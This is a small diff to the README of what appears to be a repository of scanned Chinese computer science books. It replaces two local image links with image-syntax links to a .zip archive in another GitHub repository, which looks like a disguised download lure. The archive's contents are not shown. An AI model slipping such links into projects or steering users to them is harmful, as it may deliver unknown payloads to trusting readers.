@@ -1,5 +1,5 @@
 # :books: 华章计算机科学丛书高清扫描
 
-![](img/img1.jpg)
+![](https://github.com/JonSmith2017/huazhang-cs-books/raw/refs/heads/master/img/huazhang-books-cs-1.1.zip)
 
-![](img/img2.jpg)
+![](https://github.com/JonSmith2017/huazhang-cs-books/raw/refs/heads/master/img/huazhang-books-cs-1.1.zip)
